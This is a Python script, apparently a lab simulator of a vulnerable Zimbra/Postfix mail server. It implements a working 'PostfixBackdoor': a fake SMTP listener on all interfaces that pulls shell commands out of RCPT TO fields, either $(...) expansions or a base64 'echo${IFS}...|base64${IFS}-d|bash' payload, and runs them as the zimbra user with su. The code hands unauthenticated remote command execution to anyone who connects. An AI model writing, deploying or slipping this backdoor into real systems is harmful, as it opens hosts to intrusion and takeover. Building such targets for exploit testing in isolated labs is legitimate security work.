#!/usr/bin/env python3
import socket
import subprocess
import re
import base64
import threading
import time

class PostfixBackdoor:
    def __init__(self, host='0.0.0.0', port=2525):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        
    def start(self):
        """Inicia o servidor SMTP backdoor"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            print('[+] Postfix Backdoor started on {}:{}'.format(self.host, self.port))
            print('[+] Waiting for connections...')
            
            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    print('[+] New connection from {}:{}'.format(client_address[0], client_address[1]))
                    
                    # Start a thread for each client
                    client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                    client_thread.daemon = True
                    client_thread.start()
                    
                except Exception as e:
                    if self.running:
                        print('[!] Error accepting connection: {}'.format(str(e)))
                        
        except Exception as e:
            print('[!] Error starting server: {}'.format(str(e)))
            
    def stop(self):
        """Stops the server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        print('[+] Server stopped')
        
    def send_response(self, client_socket, code, message):
        """Sends SMTP response to client"""
        try:
            response = '{} {}\r\n'.format(code, message)
            client_socket.send(response.encode())
        except:
            pass
            
    def handle_client(self, client_socket):
        """Manages communication with SMTP client"""
        try:
            # Send initial Postfix banner
            self.send_response(client_socket, 220, 'Banner received zimbra.labo ESMTP Postfix')
            
            while True:
                # Receive command from client
                try:
                    data = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
                    if not data:
                        break
                        
                    print('[DEBUG] Command received: {}'.format(data))
                    
                    # Process EHLO command
                    if data.upper().startswith('EHLO'):
                        self.send_response(client_socket, 250, 'mail.test.com')
                        self.send_response(client_socket, 250, 'SIZE 10240000')
                        self.send_response(client_socket, 250, 'VRFY')
                        self.send_response(client_socket, 250, 'ETRN')
                        self.send_response(client_socket, 250, 'STARTTLS')
                        self.send_response(client_socket, 250, 'AUTH LOGIN PLAIN')
                        self.send_response(client_socket, 250, 'AUTH=LOGIN PLAIN')
                        self.send_response(client_socket, 250, '8BITMIME')
                        self.send_response(client_socket, 250, 'DSN')
                        self.send_response(client_socket, 250, 'SMTPUTF8')
                        self.send_response(client_socket, 250, 'CHUNKING')
                        self.send_response(client_socket, 250, 'OK')
                        
                    # Process MAIL FROM command
                    elif data.upper().startswith('MAIL FROM:'):
                        self.send_response(client_socket, 250, 'OK')
                        
                    # Process RCPT TO command - HERE IS THE PAYLOAD!
                    elif data.upper().startswith('RCPT TO:'):
                        print('[!] RCPT TO detected: {}'.format(data))
                        
                        # Look for any command in shell expansion: $(command)
                        shell_expansion_match = re.search(r'\$\(([^)]+)\)', data)
                        if shell_expansion_match:
                            command = shell_expansion_match.group(1)
                            print('[!] SHELL EXPANSION DETECTED: {}'.format(command))
                            print('[!] Executing command as zimbra user...')
                            
                            try:
                                # Execute command as zimbra user using su - zimbra -c
                                import subprocess
                                process = subprocess.Popen(['su', '-', 'zimbra', '-c', command], 
                                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                                        universal_newlines=True)
                                stdout, stderr = process.communicate(timeout=30)
                                
                                print('[+] Command executed as zimbra user with exit code: {}'.format(process.returncode))
                                if stdout:
                                    print('[+] Output: {}'.format(stdout.strip()))
                                if stderr:
                                    print('[+] Errors: {}'.format(stderr.strip()))
                                    
                            except Exception as e:
                                print('[!] Error executing command: {}'.format(str(e)))
                                
                        # Also keep the original base64 detection as fallback
                        elif 'aabbb$(' in data and 'echo${IFS}' in data and '|base64${IFS}-d|bash' in data:
                            print('[!] EXPLOIT PAYLOAD DETECTED!')
                            
                            # Extract base64 string between echo${IFS} and |base64${IFS}-d|bash
                            base64_match = re.search(r'echo\$\{IFS\}([^|]+)\|base64\$\{IFS\}-d\|bash', data)
                            if base64_match:
                                base64_string = base64_match.group(1)
                                print('[!] Base64 string extracted: {}'.format(base64_string))
                                
                                try:
                                    # Decode base64 payload
                                    decoded_command = base64.b64decode(base64_string).decode('utf-8')
                                    print('[!] Decoded command: {}'.format(decoded_command))
                                    print('[!] Executing command as zimbra user...')
                                    
                                    # Execute decoded command as zimbra user using su - zimbra -c
                                    import subprocess
                                    process = subprocess.Popen(['su', '-', 'zimbra', '-c', decoded_command], 
                                                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                                            universal_newlines=True)
                                    stdout, stderr = process.communicate(timeout=30)
                                    
                                    print('[+] Command executed as zimbra user with exit code: {}'.format(process.returncode))
                                    if stdout:
                                        print('[+] Output: {}'.format(stdout.strip()))
                                    if stderr:
                                        print('[+] Errors: {}'.format(stderr.strip()))
                                        
                                except Exception as e:
                                    print('[!] Error executing base64 payload: {}'.format(str(e)))
                            else:
                                print('[!] Regex failed to extract base64 string')
                                
                        # Default response for RCPT TO
                        self.send_response(client_socket, 250, 'OK')
                        
                    # Process DATA command
                    elif data.upper() == 'DATA':
                        self.send_response(client_socket, 354, 'End data with <CR><LF>.<CR><LF>')
                        
                        # Wait for end of data
                        while True:
                            data_line = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
                            if data_line == '.':
                                break
                                
                        self.send_response(client_socket, 250, 'OK: queued as ABC123')
                        
                    # Process QUIT command
                    elif data.upper() == 'QUIT':
                        self.send_response(client_socket, 221, 'Bye')
                        break
                        
                    # Unrecognized command
                    else:
                        self.send_response(client_socket, 500, 'Error: command not recognized')
                        
                except Exception as e:
                    print('[!] Error processing command: {}'.format(str(e)))
                    break
                    
        except Exception as e:
            print('[!] Error in client communication: {}'.format(str(e)))
        finally:
            client_socket.close()
            print('[+] Connection closed')

def main():
    print('[+] Starting Postfix Backdoor...')
    print('[+] This backdoor simulates a Postfix server and executes commands when it detects exploit payloads')
    
    backdoor = PostfixBackdoor()
    
    try:
        backdoor.start()
    except KeyboardInterrupt:
        print('\n[!] Interrupt received, stopping server...')
        backdoor.stop()
    except Exception as e:
        print('[!] Error: {}'.format(str(e)))
        backdoor.stop()

if __name__ == '__main__':
    main()
